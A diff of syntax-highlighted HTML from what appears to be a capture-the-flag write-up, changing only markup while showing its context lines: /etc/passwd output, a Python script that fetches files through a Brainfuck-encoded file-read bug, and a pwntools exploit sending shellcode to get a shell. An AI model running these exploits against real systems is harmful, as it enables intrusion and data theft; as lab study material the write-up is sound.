@@ -459,7 +459,7 @@ robert:x:1003:1003:robert,,,:/home/robert:/bin/bash
 sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
 </code></pre><p>Bingo!</p>
 <p>So we are able to read files as <code>tyler</code> but we already looked around on the server as <code>jack</code> so we are interested in the files in tyler&rsquo;s home directory. We can not use tools like dirbuster because it crashes the server so my solution was to come up with a simple python script to encode all wordlist entries to Brainfuck, request the file and save it:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
 
 <span style="color:#f92672">import</span> http.client
 <span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> sleep
@@ -479,15 +479,15 @@ wordlist <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/
     ascii_value <span style="color:#f92672">=</span> ord(char)
     factor <span style="color:#f92672">=</span> ascii_value <span style="color:#f92672">/</span> <span style="color:#ae81ff">10</span>
     remaining <span style="color:#f92672">=</span> ascii_value <span style="color:#f92672">%</span> <span style="color:#ae81ff">10</span>
-    result_code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;{}&#34;</span><span style="color:#f92672">.</span>format(<span style="color:#e6db74">&#34;+&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span>)
+    result_code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(<span style="color:#e6db74">&#34;+&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span>)
     result_code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;[&#34;</span>
     result_code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&gt;&#34;</span>
-    result_code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;{}&#34;</span><span style="color:#f92672">.</span>format(<span style="color:#e6db74">&#34;+&#34;</span> <span style="color:#f92672">*</span> int(factor))
+    result_code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(<span style="color:#e6db74">&#34;+&#34;</span> <span style="color:#f92672">*</span> int(factor))
     result_code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&lt;&#34;</span>
     result_code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;-&#34;</span>
     result_code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;]&#34;</span>
     result_code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&gt;&#34;</span>
-    result_code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;{}&#34;</span><span style="color:#f92672">.</span>format(<span style="color:#e6db74">&#34;+&#34;</span> <span style="color:#f92672">*</span> remaining)
+    result_code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(<span style="color:#e6db74">&#34;+&#34;</span> <span style="color:#f92672">*</span> remaining)
     result_code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;.&#34;</span>
     result_code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;[-]&#34;</span>
     <span style="color:#66d9ef">return</span> result_code
@@ -512,14 +512,14 @@ counter <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span
         resp <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>getresponse()
         data <span style="color:#f92672">=</span> resp<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>strip()
         <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;404: Not Found&#34;</span> <span style="color:#f92672">in</span> data:
-            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;File {} not found&#34;</span><span style="color:#f92672">.</span>format(w))
+            print(<span style="color:#e6db74">&#34;File </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> not found&#34;</span><span style="color:#f92672">.</span>format(w))
         <span style="color:#66d9ef">else</span>:
-            filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;{}_{}.loot&#34;</span><span style="color:#f92672">.</span>format(counter, w<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#e6db74">&#34;_&#34;</span>))
+            filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">_</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">.loot&#34;</span><span style="color:#f92672">.</span>format(counter, w<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#e6db74">&#34;_&#34;</span>))
             sf(filename, data)
-            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;File {} saved!!!!!!&#34;</span><span style="color:#f92672">.</span>format(w))
+            print(<span style="color:#e6db74">&#34;File </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> saved!!!!!!&#34;</span><span style="color:#f92672">.</span>format(w))
     <span style="color:#66d9ef">except</span> http<span style="color:#f92672">.</span>client<span style="color:#f92672">.</span>IncompleteRead:
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;File {} returned an error (most likely it&#39;s a directory)&#34;</span><span style="color:#f92672">.</span>format(w))
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;This request crashed the webserver so let&#39;s wait a little ....&#34;</span>)
+        print(<span style="color:#e6db74">&#34;File </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> returned an error (most likely it&#39;s a directory)&#34;</span><span style="color:#f92672">.</span>format(w))
+        print(<span style="color:#e6db74">&#34;This request crashed the webserver so let&#39;s wait a little ....&#34;</span>)
         sleep(<span style="color:#ae81ff">30</span>)
     <span style="color:#66d9ef">finally</span>:
         <span style="color:#66d9ef">if</span> conn:
@@ -569,18 +569,18 @@ _ jump to the new value and hope we hit a location where the read call is execut
 </ul>
 <p>To find the value to subtract from EDX we simply loop over 0 till 255 and try every value. This will jump in one byte steps relative to the <code>CALL</code> instruction till we hit the <code>READ</code> call again.</p>
 <p>Once the correct offset is found, <code>/bin/sh</code> is executed and we have a shell as <code>robert</code>!</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
 
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
 context(bits<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span>,
         os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>,
-        aslr<span style="color:#f92672">=</span>False,
+        aslr<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
         <span style="color:#75715e"># log_level=&#39;DEBUG&#39;,</span>
         terminal<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;tmux&#39;</span>, <span style="color:#e6db74">&#39;splitw&#39;</span>, <span style="color:#e6db74">&#39;-l&#39;</span>, <span style="color:#e6db74">&#39;45&#39;</span>])
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encode_payload</span>(p):
-    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x{:02x}&#34;</span><span style="color:#f92672">.</span>format(ord(c)) <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> p)
+    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x</span><span style="color:#e6db74">{:02x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(ord(c)) <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> p)
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">calculate_iterations</span>(number):
     number <span style="color:#f92672">=</span> float(number)
@@ -590,16 +590,16 @@ context(bits<span style="color:#f92672">=</span><span style="color:#ae81ff">64</
         number <span style="color:#f92672">/=</span> <span style="color:#ae81ff">2</span>
     <span style="color:#66d9ef">return</span> iterations
 
-local <span style="color:#f92672">=</span> False
+local <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
 <span style="color:#75715e">#  local = True</span>
-debug <span style="color:#f92672">=</span> False
+debug <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
 
 offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
 
 <span style="color:#75715e"># the read call should be in the last 255 bytes</span>
 <span style="color:#66d9ef">while</span> offset <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">255</span>:
     <span style="color:#66d9ef">try</span>:
-        log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Trying offset {}&#34;</span><span style="color:#f92672">.</span>format(offset))
+        log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Trying offset </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(offset))
         <span style="color:#66d9ef">if</span> local:
             p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./tenbytes&#34;</span>)
             <span style="color:#66d9ef">if</span> debug:
@@ -630,9 +630,9 @@ offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
         payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">10</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span>)
 
         <span style="color:#66d9ef">if</span> len(payload) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">10</span>:
-            log<span style="color:#f92672">.</span>error(<span style="color:#e6db74">&#34;Payload too long! ({} bytes). Offset {}&#34;</span><span style="color:#f92672">.</span>format(len(payload), offset))
+            log<span style="color:#f92672">.</span>error(<span style="color:#e6db74">&#34;Payload too long! (</span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> bytes). Offset </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(len(payload), offset))
 
-        log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Payload: {}&#34;</span><span style="color:#f92672">.</span>format(encode_payload(payload)))
+        log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Payload: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(encode_payload(payload)))
 
         p<span style="color:#f92672">.</span>recvline() <span style="color:#75715e"># receive greeting</span>
 
@@ -646,10 +646,10 @@ offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
         <span style="color:#75715e">#  8:   0x500    = 1280</span>
         edx_should_be <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x500</span> <span style="color:#75715e"># length of the next read</span>
         iterations <span style="color:#f92672">=</span> calculate_iterations(edx_should_be)
-        log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Iterations: {}&#34;</span><span style="color:#f92672">.</span>format(iterations))
+        log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Iterations: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(iterations))
         <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, iterations):
             p<span style="color:#f92672">.</span>send(payload)
-        log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;EDX should now be {:#4x}&#34;</span><span style="color:#f92672">.</span>format(edx_should_be))
+        log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;EDX should now be </span><span style="color:#e6db74">{:#4x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(edx_should_be))
 
         <span style="color:#75715e"># second stage</span>
         <span style="color:#75715e">#  ./msfvenom -p linux/x64/exec cmd=/bin/sh -f py -v shell</span>
@@ -673,21 +673,21 @@ offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
             p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;id&#34;</span>)
             output <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">0.1</span>)
             <span style="color:#66d9ef">if</span> output <span style="color:#f92672">and</span> <span style="color:#e6db74">&#34;uid=&#34;</span> <span style="color:#f92672">in</span> output:
-                log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Found offset!!! {}&#34;</span><span style="color:#f92672">.</span>format(offset))
+                log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Found offset!!! </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(offset))
                 <span style="color:#66d9ef">break</span>
         <span style="color:#66d9ef">else</span>:
             <span style="color:#75715e"># check for no tty message</span>
             p<span style="color:#f92672">.</span>sendline()
             output <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">0.5</span>)
             <span style="color:#66d9ef">if</span> output <span style="color:#f92672">and</span> <span style="color:#e6db74">&#34;tty&#34;</span> <span style="color:#f92672">in</span> output:
-                log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Found offset!!! {}&#34;</span><span style="color:#f92672">.</span>format(offset))
+                log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Found offset!!! </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(offset))
                 <span style="color:#66d9ef">break</span>
 
         <span style="color:#66d9ef">if</span> offset <span style="color:#f92672">==</span> <span style="color:#ae81ff">255</span>:
             log<span style="color:#f92672">.</span>error(<span style="color:#e6db74">&#34;No valid offset found!&#34;</span>)
         p<span style="color:#f92672">.</span>close()
     <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">EOFError</span>:
-        log<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">&#34;Error on offset {}&#34;</span><span style="color:#f92672">.</span>format(offset))
+        log<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">&#34;Error on offset </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(offset))
         p<span style="color:#f92672">.</span>close()
     <span style="color:#66d9ef">finally</span>:
         offset <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
